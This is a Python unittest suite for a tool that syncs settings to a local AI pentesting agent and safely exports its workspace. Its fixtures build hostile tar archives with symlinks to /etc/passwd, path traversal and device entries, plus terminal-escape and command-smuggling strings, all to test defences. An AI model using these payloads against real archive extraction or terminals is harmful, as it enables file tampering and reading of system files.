"""Tests for bin/secops-flow.py (pentagi provider/template sync), the pentagi MCP bridge, and the shell
functional tests in tests/func/.

Run from the repo root:  python3 -m unittest discover -s tests -v
secops-flow and the bridge need `requests` (the host venv has it); without it those tests are skipped.
The pentagi API is a local fake on 127.0.0.1; the mcp package is stubbed. No network, no Docker.
"""
import contextlib
import importlib.util
import io
import json
import os
import shlex
import shutil
import stat
import subprocess
import sys
import tarfile
import tempfile
import threading
import types
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parent.parent
sys.dont_write_bytecode = True   # don't leave __pycache__ in scripts/, bin/, mcp/
try:
    import requests  # noqa: F401
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False

TOKEN = "placeholder-test-token"
NEEDS_REQUESTS = "requests isn't installed: run the suite with $SECOPS/venv/bin/python3"


def dead_proxy_env():
    """Proxy variables pointing at a closed local port: a client that honours them can't connect anywhere."""
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    url = f"http://127.0.0.1:{port}"
    return {k: url for k in ("HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy")}


def load(name, path, env):
    with mock.patch.dict(os.environ, env):
        spec = importlib.util.spec_from_file_location(name, path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
    return mod


# --------------------------------------------------------------------------- fake pentagi GraphQL
class FakePentagi:
    def __init__(self):
        self.providers, self.templates, self.next_id = [], [], 1
        self.full_query_ok, self.fail_names, self.auth_failures = True, set(), 0
        self.fail_message = "boom"

    def _id(self):
        self.next_id += 1
        return str(self.next_id)

    def graphql(self, q, v):
        if "settingsProviders" in q:
            if "agents{" in q and not self.full_query_ok:
                return {"errors": [{"message": "Cannot query field \"agents\""}]}
            rows = [dict(p) for p in self.providers] if "agents{" in q else \
                [{"id": p["id"], "name": p["name"]} for p in self.providers]
            return {"data": {"settingsProviders": {"userDefined": rows}}}
        if "createProvider" in q:
            if v["n"] in self.fail_names:
                return {"errors": [{"message": self.fail_message}]}
            self.providers.append({"id": self._id(), "name": v["n"], "type": v["t"], "agents": v["a"]})
            return {"data": {"createProvider": {"id": self.providers[-1]["id"]}}}
        if "updateProvider" in q:
            p = next(p for p in self.providers if p["id"] == v["id"])
            p["agents"] = v["a"]
            return {"data": {"updateProvider": {"id": p["id"]}}}
        if "deleteProvider" in q:
            self.providers = [p for p in self.providers if p["id"] != v["id"]]
            return {"data": {"deleteProvider": "success"}}
        if "flowTemplates" in q:
            return {"data": {"flowTemplates": [dict(t) for t in self.templates]}}
        if "createFlowTemplate" in q:
            self.templates.append({"id": self._id(), **v["i"]})
            return {"data": {"createFlowTemplate": {"id": self.templates[-1]["id"]}}}
        if "updateFlowTemplate" in q:
            t = next(t for t in self.templates if t["id"] == v["id"])
            t.update(v["i"])
            return {"data": {"updateFlowTemplate": {"id": t["id"]}}}
        return {"errors": [{"message": "unknown query"}]}


def serve(fake):
    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
            if self.headers.get("Authorization") != f"Bearer {TOKEN}":
                fake.auth_failures += 1
                self.send_response(401)
                self.end_headers()
                return
            out = json.dumps(fake.graphql(body["query"], body.get("variables") or {})).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


@unittest.skipUnless(HAVE_REQUESTS, NEEDS_REQUESTS)
class TestSecopsFlowSync(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="secstack-flow-")
        cls.secops = Path(cls.tmp) / "sec-ops"
        cls.fake = FakePentagi()
        cls.srv = serve(cls.fake)
        url = f"http://127.0.0.1:{cls.srv.server_address[1]}/api/v1"
        cls.flow = load("secops_flow", REPO / "bin" / "secops-flow.py",
                        {"SECOPS": str(cls.secops), "PENTAGI_URL": url})

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def setUp(self):
        proxies = mock.patch.dict(os.environ, dead_proxy_env())    # a client that honours proxies fails here
        proxies.start()
        self.addCleanup(proxies.stop)
        for k in ("NO_PROXY", "no_proxy"):
            os.environ.pop(k, None)
        shutil.rmtree(self.secops, ignore_errors=True)
        (self.secops / "env").mkdir(parents=True)
        (self.secops / "env" / "pentagi-api-token").write_text(TOKEN + "\n")
        self.pdir = self.secops / "configs" / "pentagi-providers"
        self.tdir = self.secops / "configs" / "flow-templates"
        self.pdir.mkdir(parents=True)
        self.tdir.mkdir(parents=True)
        self.fake.providers, self.fake.templates = [], []
        self.fake.full_query_ok, self.fake.fail_names = True, set()

    def provider(self, fname, name, model="m1", reasoning=None):
        doc = {"name": name, "type": "ollama", "_generated_by": "scripts/plan.py",
               "default": {"model": model, "n": 1, "max_tokens": 16384, "reasoning": reasoning or {"mode": "off"}},
               "roles": {"adviser": {"model": model, "reasoning": None}}}
        (self.pdir / fname).write_text(json.dumps(doc))

    def run_sync(self, fn, *args):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = fn(*args)
        return rc, out.getvalue() + err.getvalue()

    def backups(self, kind):
        return sorted((self.secops / "logs").glob(f"pentagi-{kind}-backup-*.json"))

    def test_loopback_session_ignores_proxies(self):
        self.assertFalse(self.flow.LOCAL.trust_env)

    def test_create_all_roles(self):
        self.provider("10-local-a.json", "local-a")
        rc, _ = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 0)
        agents = self.fake.providers[0]["agents"]
        self.assertEqual(set(agents), set(self.flow.ROLE_KEYS.values()))
        self.assertEqual(agents["pentester"]["reasoning"], {"mode": "off"})
        self.assertNotIn("reasoning", agents["adviser"])          # adviser keeps the model's default thinking
        self.assertEqual(agents["coder"]["maxTokens"], 16384)

    def test_create_only_never_touches_existing(self):
        self.fake.providers = [{"id": "1", "name": "local-a", "type": "ollama", "agents": {"tuned": True}}]
        self.provider("10-local-a.json", "local-a", model="new")
        self.provider("20-local-b.json", "local-b")
        rc, out = self.run_sync(self.flow.providers_sync, True)
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.fake.providers[0]["agents"], {"tuned": True})
        self.assertEqual([p["name"] for p in self.fake.providers], ["local-a", "local-b"])
        self.assertEqual(self.backups("providers"), [])

    def test_update_backs_up_first(self):
        self.fake.providers = [{"id": "1", "name": "local-a", "type": "ollama", "agents": {"tuned": True}}]
        self.provider("10-local-a.json", "local-a", model="new")
        rc, out = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.fake.providers[0]["agents"]["simple"]["model"], "new")
        (b,) = self.backups("providers")
        self.assertEqual(stat.S_IMODE(b.stat().st_mode), 0o600)
        self.assertEqual(json.loads(b.read_text())[0]["agents"], {"tuned": True})

    def test_prune_only_removes_generated_names(self):
        self.fake.providers = [{"id": "1", "name": "local-gptoss20", "type": "ollama", "agents": {}},
                               {"id": "2", "name": "my-own", "type": "ollama", "agents": {}}]
        self.provider("10-local-a.json", "local-a")
        rc, out = self.run_sync(self.flow.providers_sync, True, True)
        self.assertEqual(rc, 0, out)
        self.assertEqual(sorted(p["name"] for p in self.fake.providers), ["local-a", "my-own"])
        self.assertEqual(len(self.backups("providers")), 1)

    def test_no_prune_when_a_file_failed(self):
        self.fake.providers = [{"id": "1", "name": "local-gptoss20", "type": "ollama", "agents": {}}]
        (self.pdir / "05-broken.json").write_text("{not json")
        self.provider("10-local-a.json", "local-a")
        rc, out = self.run_sync(self.flow.providers_sync, False, True)
        self.assertEqual(rc, 1)
        self.assertIn("not pruning", out)
        self.assertIn("local-gptoss20", [p["name"] for p in self.fake.providers])

    def test_prune_needs_a_backup(self):
        """A pentagi without the settings query can't be backed up, so --prune deletes nothing there."""
        self.fake.full_query_ok = False
        self.fake.providers = [{"id": "1", "name": "local-gptoss20", "type": "ollama", "agents": {}}]
        self.provider("10-local-a.json", "local-a")
        rc, out = self.run_sync(self.flow.providers_sync, True, True)
        self.assertEqual(rc, 1, out)
        self.assertEqual(sorted(p["name"] for p in self.fake.providers), ["local-a", "local-gptoss20"])
        self.assertEqual(self.backups("providers"), [])

    def test_a_number_too_big_fails_only_its_file(self):
        (self.pdir / "05-big.json").write_text('{"name": "local-big", "default": {"model": "m", "max_tokens": 1e999}}')
        self.provider("10-local-a.json", "local-a")
        rc, out = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 1)
        self.assertIn("05-big.json", out)
        self.assertEqual([p["name"] for p in self.fake.providers], ["local-a"])

    def test_pentagi_errors_are_printed_escaped(self):
        self.fake.fail_names, self.fake.fail_message = {"local-a"}, "no\x1b]52;c;ZXZpbA==\x07pe\x9b2J"
        self.provider("10-local-a.json", "local-a")
        rc, out = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 1)
        self.assertIn("no\\x1b]52;c;ZXZpbA==\\x07pe\\x9b2J", out)
        self.assertFalse({"\x1b", "\x07", "\x9b"} & set(out))

    def test_refused_token_stops_with_a_clean_error(self):
        (self.secops / "env" / "pentagi-api-token").write_text("another-valid-looking-token\n")
        self.provider("10-local-a.json", "local-a")
        err = io.StringIO()
        with mock.patch.object(sys, "argv", ["secops-flow", "providers-sync"]), contextlib.redirect_stderr(err), \
                contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(self.flow.main(), 2)
        self.assertIn("HTTP 401", err.getvalue())
        self.assertNotIn("another-valid-looking-token", err.getvalue())
        self.assertEqual(self.fake.providers, [])

    def test_bad_file_doesnt_stop_the_rest(self):
        (self.pdir / "05-broken.json").write_text("{not json")
        self.provider("06-bad-name.json", "evil name; drop")
        self.provider("10-local-a.json", "local-a")
        self.fake.fail_names = {"local-b"}
        self.provider("20-local-b.json", "local-b")
        self.provider("30-local-c.json", "local-c")
        rc, out = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 1)
        self.assertEqual([p["name"] for p in self.fake.providers], ["local-a", "local-c"])
        self.assertIn("05-broken.json", out)
        self.assertIn("local-b", out)

    def test_old_pentagi_without_settings_query(self):
        self.fake.full_query_ok = False
        self.fake.providers = [{"id": "1", "name": "local-a", "type": "ollama", "agents": {"tuned": True}}]
        self.provider("10-local-a.json", "local-a", model="new")
        self.provider("20-local-b.json", "local-b")
        rc, out = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 1)
        self.assertEqual(self.fake.providers[0]["agents"], {"tuned": True})   # no backup possible: no update
        self.assertIn("local-b", [p["name"] for p in self.fake.providers])

    def test_no_provider_files(self):
        rc, _ = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 1)

    def test_templates(self):
        (self.tdir / "10-a.md").write_text("# Alpha\nbody one\n")
        (self.tdir / "20-b.md").write_text("# Beta\nbody two\n")
        (self.tdir / "30-empty.md").write_text("# NoBody\n")
        rc, out = self.run_sync(self.flow.template_sync)
        self.assertEqual(rc, 1, out)                       # the empty one is reported
        self.assertEqual(sorted(t["title"] for t in self.fake.templates), ["Alpha", "Beta"])
        (self.tdir / "30-empty.md").unlink()
        (self.tdir / "10-a.md").write_text("# Alpha\nbody one, edited\n")
        rc, out = self.run_sync(self.flow.template_sync, True)
        self.assertEqual(rc, 0, out)
        self.assertEqual(next(t for t in self.fake.templates if t["title"] == "Alpha")["text"], "body one")
        rc, out = self.run_sync(self.flow.template_sync)
        self.assertEqual(rc, 0, out)
        self.assertEqual(next(t for t in self.fake.templates if t["title"] == "Alpha")["text"], "body one, edited")
        self.assertIn("same     Beta", out)
        self.assertEqual(len(self.backups("templates")), 1)

    def test_missing_token_is_a_clean_error(self):
        (self.secops / "env" / "pentagi-api-token").unlink()
        self.provider("10-local-a.json", "local-a")
        err = io.StringIO()
        with mock.patch.object(sys, "argv", ["secops-flow", "providers-sync"]), contextlib.redirect_stderr(err):
            self.assertEqual(self.flow.main(), 2)
        self.assertIn("no pentagi API token", err.getvalue())

    def test_generated_provider_files_sync_cleanly(self):
        """End to end: files written by plan.py are accepted by the sync."""
        spec = importlib.util.spec_from_file_location("plan_for_sync", REPO / "scripts" / "plan.py")
        with mock.patch.dict(os.environ, {"SECOPS": str(self.secops)}):
            plan = importlib.util.module_from_spec(spec)
            sys.modules["plan_for_sync"] = plan
            spec.loader.exec_module(plan)
        cat = plan.load_catalog()
        by_id = {x["id"]: x for x in cat}
        hw = plan.simulate(48, 12, 600)
        p = plan.compute_plan(hw)
        roles = plan.assign_roles([by_id["gpt-oss-20b"], by_id["qwen3.8-27b"], by_id["gemma4-26b"]])
        with contextlib.redirect_stdout(io.StringIO()):
            plan.write_outputs(hw, p, roles, plan.embed_model(cat))
        rc, out = self.run_sync(self.flow.providers_sync)
        self.assertEqual(rc, 0, out)
        names = [x["name"] for x in self.fake.providers]
        self.assertEqual(names[0], "local-gptoss20")
        self.assertIn("local-hybrid", names)
        gpt = self.fake.providers[0]["agents"]
        self.assertEqual(gpt["primaryAgent"]["reasoning"], {"effort": "low"})   # gpt-oss can't turn thinking off
        hybrid = next(x for x in self.fake.providers if x["name"] == "local-hybrid")["agents"]
        self.assertEqual(hybrid["adviser"]["model"], "qwen3.8-27b-abliterated")


def _entry(name, kind=tarfile.REGTYPE, data=b"", linkname=""):
    info = tarfile.TarInfo(name)
    info.type, info.linkname = kind, linkname
    info.mode = 0o644 if kind == tarfile.REGTYPE else 0o755
    if kind == tarfile.REGTYPE:
        info.size = len(data)
        return info, data
    return info, None


# A `docker cp` stand-in that streams a tar without storing it: arguments are name=size (file data is "0"s).
TAR_GEN = r'''
import sys, tarfile
out = sys.stdout.buffer
def head(name, kind, size=0):
    ti = tarfile.TarInfo(name)
    ti.type, ti.size = kind, size
    return ti.tobuf(format=tarfile.PAX_FORMAT)
out.write(head("workspace", tarfile.DIRTYPE))
block = b"0" * 65536
for spec in sys.argv[1:]:
    name, size = spec.rsplit("=", 1)
    size = left = int(size)
    out.write(head(name, tarfile.REGTYPE, size))
    while left:
        n = min(left, len(block))
        out.write(block[:n])
        left -= n
    out.write(b"\0" * (-size % 512))
out.write(b"\0" * 1024)
'''

# secops-flow's main() in a child process, for the SIGTERM tests: argv is the script, the docker, xattr and
# `secstack` stand-ins, then the command line. pentagi is faked: a finished flow without logs for report, a refused
# token for watch (so the watcher gives up and runs `secstack down`).
TERM_CHILD = r'''
import importlib.util, sys
spec = importlib.util.spec_from_file_location("secops_flow_term", sys.argv[1])
flow = importlib.util.module_from_spec(spec)
spec.loader.exec_module(flow)
flow.IS_MAC, flow.DOCKER, flow.XATTR, flow.SECSTACK = True, sys.argv[2], sys.argv[3], sys.argv[4]
flow.rows = lambda path, key: []
flow.notify = lambda title, text: None
cmd = sys.argv[5]
def api(method, path, **kw):
    if cmd == "watch":
        raise flow.ApiError("refused", 401)
    return {"title": "t", "status": "finished"}
flow.api = api
sys.argv = ["secops-flow"] + sys.argv[5:]
sys.exit(flow.main())
'''


def nvd_record(cve, status="Analyzed", desc="A flaw.", cpes=()):
    """An NVD CVE record. cpes: CPE strings (marked vulnerable) or (CPE, vulnerable) pairs, as in NVD's
    "running on" configurations, where the platform is listed with vulnerable false."""
    match = [{"criteria": c, "vulnerable": True} if isinstance(c, str) else {"criteria": c[0], "vulnerable": c[1]}
             for c in cpes]
    return {"id": cve, "vulnStatus": status, "published": "2021-12-10", "descriptions": [{"lang": "en", "value": desc}],
            "configurations": [{"nodes": [{"cpeMatch": match}]}]}


class FakeFlowLogs:
    """pentagi's flow endpoints for the report: /flows/7, and the msglogs/termlogs lists, newest first (ORDER BY
    id DESC), paged by page/pageSize, with the total counted before paging. A row's "text" may be an int: that
    many bytes of "A", streamed (never stored), the way pentagi keeps whole command outputs. Logs each request."""

    def __init__(self, logs):
        self.logs, self.calls = logs, []

    def serve(self):
        from urllib.parse import parse_qs, urlsplit
        fake = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                u = urlsplit(self.path)
                q = {k: v[0] for k, v in parse_qs(u.query).items()}
                key = u.path.rstrip("/").rsplit("/", 1)[-1]
                fake.calls.append((key, q))
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                if key not in fake.logs:
                    self.wfile.write(json.dumps({"status": "success", "data": {"id": 7, "status": "finished"}}).encode())
                    return
                rows, page, size = fake.logs[key], int(q.get("page", 1)), int(q.get("pageSize", 5))
                part = rows[(page - 1) * size:page * size]
                try:
                    self.wfile.write(b'{"status":"success","data":{"%s":[' % key.encode())
                    for n, row in enumerate(part):
                        head = json.dumps({k: v for k, v in row.items() if k != "text"})[:-1]
                        self.wfile.write((b"," if n else b"") + head.encode() + b',"text":"')
                        if isinstance(row.get("text"), int):
                            left = row["text"]
                            while left:
                                k = min(left, 65536)
                                self.wfile.write(b"A" * k)
                                left -= k
                        else:
                            self.wfile.write(json.dumps(row.get("text", ""))[1:-1].encode())
                        self.wfile.write(b'"}')
                    self.wfile.write(b'],"total":%d}}' % len(rows))
                except (BrokenPipeError, ConnectionResetError):
                    pass                              # the client stopped reading: that's the point
        srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        return srv


class FakeNvd:
    """Local stand-in for NVD's CVE API (also usable as the proxy in front of it): answers records, unknown IDs
    with totalResults 0, and canned (status, body) replies; logs (cveId, apiKey header, request target)."""

    def __init__(self):
        self.records, self.replies, self.calls = {}, {}, []

    def serve(self):
        from urllib.parse import parse_qs, urlsplit
        fake = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                cve = (parse_qs(urlsplit(self.path).query).get("cveId") or [""])[0]
                fake.calls.append((cve, self.headers.get("apiKey"), self.path))
                status, body = fake.replies.get(cve, (200, None))
                if body is None:
                    rec = fake.records.get(cve)
                    body = json.dumps({"totalResults": 1, "vulnerabilities": [{"cve": rec}]} if rec
                                      else {"totalResults": 0}).encode()
                self.send_response(status)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
        srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        return srv


@unittest.skipUnless(HAVE_REQUESTS, NEEDS_REQUESTS)
class TestSecopsFlowSafety(unittest.TestCase):
    """Report export from an agent-controlled workspace, the watcher's exits, NVD checks, URL and token checks.
    NVD is a local fake; HTTP(S)_PROXY point at a dead port, so a client that honours proxies fails."""

    def setUp(self):
        import time as real_time
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.t = Path(self.tmp.name).resolve()
        self.secops = self.t / "sec-ops"
        (self.secops / "env").mkdir(parents=True)
        (self.secops / "logs").mkdir()
        (self.secops / "env" / "pentagi-api-token").write_text(TOKEN + "\n")
        env = mock.patch.dict(os.environ, dead_proxy_env())
        env.start()
        self.addCleanup(env.stop)
        for k in ("NO_PROXY", "no_proxy", "SECSTACK_NVD_PROXY"):
            os.environ.pop(k, None)
        self.flow = load("secops_flow_safety", REPO / "bin" / "secops-flow.py",
                         {"SECOPS": str(self.secops), "PENTAGI_URL": "https://127.0.0.1:8443/api/v1"})
        self.nvd = FakeNvd()
        srv = self.nvd.serve()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        for k, v in {"NVD_URL": f"http://127.0.0.1:{srv.server_address[1]}/rest/json/cves/2.0", "IS_MAC": False,
                     "time": types.SimpleNamespace(time=real_time.time, sleep=lambda s: None)}.items():
            p = mock.patch.object(self.flow, k, v)
            p.start()
            self.addCleanup(p.stop)
        self.victim = self.t / "victim.txt"
        self.victim.write_text("keep")
        self.victim.chmod(0o644)
        self.calls = self.t / "docker-calls"

    # ------------------------------------------------------------ docker stand-ins
    def stub(self, payload, inspect="exit 0"):
        """A docker stand-in: logs its arguments, runs `inspect` for inspect (yes, by default), payload for `cp`."""
        stub = self.t / "docker"
        stub.write_text("#!/bin/sh\n"
                        f"printf '%s\\n' \"$*\" >> {shlex.quote(str(self.calls))}\n"
                        f"[ \"$1\" = inspect ] && {{ {inspect}; }}\n" + payload + "\n")
        stub.chmod(0o755)
        return str(stub)

    def docker_calls(self):
        return [line.split(" ") for line in self.calls.read_text().splitlines()] if self.calls.exists() else []

    def tar_docker(self, members, then="", cut=None, name="ws.tar"):
        """A docker whose `cp` streams a tar of members (cut after `cut` bytes), then runs `then`."""
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w", format=tarfile.PAX_FORMAT, encoding="utf-8",
                          errors="surrogateescape") as tar:
            for info, data in members:
                tar.addfile(info, io.BytesIO(data) if data is not None else None)
        path = self.t / name
        path.write_bytes(buf.getvalue()[:cut] if cut else buf.getvalue())
        return self.stub(f"cat {shlex.quote(str(path))}{then}" if then else f"exec cat {shlex.quote(str(path))}")

    def gen_docker(self, *specs):
        gen = self.t / "gen.py"
        gen.write_text(TAR_GEN)
        return self.stub(f"exec {shlex.quote(sys.executable)} -I {shlex.quote(str(gen))} " + " ".join(specs))

    def hostile(self, outside):
        return [_entry("workspace", tarfile.DIRTYPE),
                _entry("workspace/REPORT.md", data=b"# Report\nfound things\n"),
                _entry("workspace/notes", tarfile.DIRTYPE),
                _entry("workspace/notes/scan.txt", data=b"nmap output"),
                _entry("workspace/passwd", tarfile.SYMTYPE, linkname="/etc/passwd"),
                _entry("workspace/outside", tarfile.SYMTYPE, linkname=str(self.victim)),
                _entry("workspace/hard", tarfile.LNKTYPE, linkname="workspace/REPORT.md"),
                _entry("workspace/../../escape.txt", data=b"x"),
                _entry(outside, data=b"x"),
                _entry("SUMMARY.md", data=b"planted"),                       # not under workspace/
                _entry("workspace/dev", tarfile.CHRTYPE),
                _entry("workspace/notes/scan.txt/deeper", data=b"x")]     # a file used as a folder

    def report(self, docker, msgs=(), flow=None, expect=None):
        f = self.flow
        with mock.patch.object(f, "DOCKER", docker), \
                mock.patch.object(f, "api", lambda *a, **k: dict(flow or {"title": "t", "status": "finished"})), \
                mock.patch.object(f, "rows", lambda path, key: [dict(m) for m in msgs] if key == "msglogs" else []), \
                contextlib.redirect_stdout(io.StringIO()) as out:
            res = f.report(7, expect)
        return res, out.getvalue()

    # ------------------------------------------------------------ workspace export
    def test_copy_workspace_keeps_only_plain_files(self):
        dest = self.t / "out"
        dest.mkdir()
        outside = str(self.t / "abs-escape.txt")
        with mock.patch.object(self.flow, "DOCKER", self.tar_docker(self.hostile(outside))):
            res = self.flow.copy_workspace("pentagi-terminal-7", dest)
        self.assertEqual(self.docker_calls(), [["cp", "pentagi-terminal-7:/workspace", "-"]])
        self.assertEqual((res.files, res.incomplete), (2, None))
        skipped = dict(res.skipped)
        for name in ("workspace/passwd", "workspace/outside", "workspace/hard", "workspace/../../escape.txt",
                     outside, "SUMMARY.md", "workspace/dev", "workspace/notes/scan.txt/deeper"):
            self.assertIn(name, skipped)
        self.assertFalse((self.t / "escape.txt").exists())
        self.assertFalse(Path(outside).exists())
        self.assertFalse((dest / "SUMMARY.md").exists())
        self.assertFalse([p for p in dest.rglob("*") if p.is_symlink()])
        self.assertEqual((dest / "workspace" / "REPORT.md").read_text(), "# Report\nfound things\n")

    def test_report_never_touches_files_outside(self):
        res, _ = self.report(self.tar_docker(self.hostile(str(self.t / "abs-escape.txt"))))
        self.assertEqual(self.docker_calls(), [["inspect", "--type", "container", "pentagi-terminal-7"],
                                               ["cp", "pentagi-terminal-7:/workspace", "-"]])
        self.assertEqual(self.victim.read_text(), "keep")
        self.assertEqual(stat.S_IMODE(self.victim.stat().st_mode), 0o644)
        self.assertIn("workspace/outside", (res.path / "skipped-links.txt").read_text())
        self.assertIn("Native REPORT.md: yes", (res.path / "SUMMARY.md").read_text())
        for p in [res.path, *res.path.rglob("*")]:
            self.assertEqual(stat.S_IMODE(p.stat().st_mode), 0o700 if p.is_dir() else 0o600, p)

    def test_workspace_copy_has_limits(self):
        mib = 2 ** 20

        def run(specs, **limits):
            dest = Path(tempfile.mkdtemp(dir=str(self.t)))
            with contextlib.ExitStack() as st:
                st.enter_context(mock.patch.object(self.flow, "DOCKER", self.gen_docker(*specs)))
                for k, v in limits.items():
                    st.enter_context(mock.patch.object(self.flow, k, v))
                res = self.flow.copy_workspace("pentagi-terminal-7", dest)
            return res, sum(p.stat().st_size for p in dest.rglob("*") if p.is_file()), dest
        # an oversized file is skipped, and the copy goes on
        res, size, _ = run(["workspace/a.txt=10", f"workspace/big.log={3 * mib}", "workspace/z.txt=10"],
                           WS_MAX_FILE=mib, WS_MAX_STREAM=8 * mib)
        self.assertIn(("workspace/big.log", "too large (3 MiB)"), res.skipped)
        self.assertEqual((res.files, size, res.incomplete), (2, 20, None))
        # past the total (a sparse file costs the agent nothing) the copy stops, and says so
        res, size, dest = run(["workspace/a.txt=10", f"workspace/huge.log={64 * mib}", "workspace/z.txt=10"],
                              WS_MAX_FILE=mib, WS_MAX_STREAM=8 * mib)
        self.assertEqual(res.incomplete, "stopped at the 8 MiB limit")
        self.assertEqual(size, 10)
        self.assertFalse((dest / "workspace" / "z.txt").exists())
        res, _, _ = run([f"workspace/f{i}.txt=1" for i in range(10)], WS_MAX_ENTRIES=5)
        self.assertEqual((res.incomplete, res.files), ("stopped after 5 entries", 4))

    def test_a_failed_write_leaves_no_half_file(self):
        import errno

        def disk_full(src, fd):
            os.write(fd, b"half")
            os.close(fd)
            raise OSError(errno.ENOSPC, "No space left on device")
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/a.log", data=b"x" * 5000),
                   _entry("workspace/b.log", data=b"y")]
        dest = self.t / "out"
        dest.mkdir()
        with mock.patch.object(self.flow, "DOCKER", self.tar_docker(members)), \
                mock.patch.object(self.flow, "_write_member", disk_full):
            res = self.flow.copy_workspace("c", dest)
        self.assertEqual(list((dest / "workspace").iterdir()), [])
        self.assertEqual(res.incomplete, "a write failed (ENOSPC)")
        self.assertIn(("workspace/a.log", "write failed (ENOSPC)"), res.skipped)

    def test_colliding_names_are_skipped(self):
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/REPORT.md", data=b"first"),
                   _entry("workspace/REPORT.md", data=b"again"), _entry("workspace/report.md", data=b"other case")]
        real_open = os.open

        def apfs_open(path, flags, *a, **k):     # APFS: names that differ only in case are one file
            p = os.fspath(path)
            return real_open(os.path.join(os.path.dirname(p), os.path.basename(p).lower()), flags, *a, **k)
        dest = self.t / "out"
        dest.mkdir()
        with mock.patch.object(self.flow, "DOCKER", self.tar_docker(members)), \
                mock.patch.object(self.flow.os, "open", apfs_open):
            res = self.flow.copy_workspace("c", dest)
        self.assertEqual((dest / "workspace" / "report.md").read_bytes(), b"first")
        self.assertEqual(res.skipped, [("workspace/REPORT.md", "name collision"),
                                       ("workspace/report.md", "name collision")])
        self.assertEqual(res.files, 1)

    def test_names_that_arent_utf8_dont_stop_the_report(self):
        import errno
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/caf\udce9.txt", data=b"x"),
                   _entry("workspace/l\udcff", tarfile.SYMTYPE, linkname="/etc/passwd")]
        res, _ = self.report(self.tar_docker(members))
        skipped = (res.path / "skipped-links.txt").read_text()
        if sys.platform == "darwin":            # APFS refuses names that aren't UTF-8 (EILSEQ): the file is skipped
            self.assertIn("caf\\xe9.txt  (not written (EILSEQ))", skipped)
        else:                                   # Linux keeps the raw byte in the name
            self.assertIn("caf\\xe9.txt", (res.path / "SUMMARY.md").read_text())
        self.assertIn("l\\xff  (link)", skipped)
        real_open = os.open

        def apfs_open(path, *a, **k):                             # APFS refuses names that aren't UTF-8
            if "\udce9" in os.fspath(path):
                raise OSError(errno.EILSEQ, "Illegal byte sequence")
            return real_open(path, *a, **k)
        with mock.patch.object(self.flow.os, "open", apfs_open):
            res, _ = self.report(self.tar_docker(members, name="ws2.tar"))
        self.assertIn("caf\\xe9.txt  (not written (EILSEQ))", (res.path / "skipped-links.txt").read_text())
        self.assertTrue((res.path / "SUMMARY.md").exists())

    def test_each_report_gets_its_own_folder(self):
        import datetime
        first = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/REPORT.md", data=b"draft"),
                 _entry("workspace/old-scan.txt", data=b"wrong host"),
                 _entry("workspace/l", tarfile.SYMTYPE, linkname="/etc")]
        second = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/REPORT.md", data=b"final")]
        frozen = types.SimpleNamespace(date=datetime.date, datetime=types.SimpleNamespace(
            now=lambda: datetime.datetime(2026, 11, 20, 14, 5, 10)))
        with mock.patch.object(self.flow, "dt", frozen):        # the watcher's report and yours, same second
            a, _ = self.report(self.tar_docker(first, name="1.tar"))
            b, _ = self.report(self.tar_docker(second, name="2.tar"))
        self.assertNotEqual(a.path, b.path)
        self.assertEqual(sorted(p.name for p in (b.path / "workspace").iterdir()), ["REPORT.md"])
        self.assertFalse((b.path / "skipped-links.txt").exists())
        self.assertEqual((a.path / "workspace" / "REPORT.md").read_text(), "draft")

    def test_an_incomplete_copy_says_so(self):
        members = [_entry("workspace", tarfile.DIRTYPE)] + \
            [_entry(f"workspace/f{i:02d}.txt", data=b"finding\n" * 300) for i in range(20)]
        # docker cp dies partway (the container went away, a file grew while it was archived)
        res, printed = self.report(self.tar_docker(members, then="; exit 1", cut=12000))
        self.assertEqual(res.incomplete, "docker cp failed (exit 1)")
        self.assertIn("**workspace copy INCOMPLETE**: docker cp failed (exit 1)", (res.path / "SUMMARY.md").read_text())
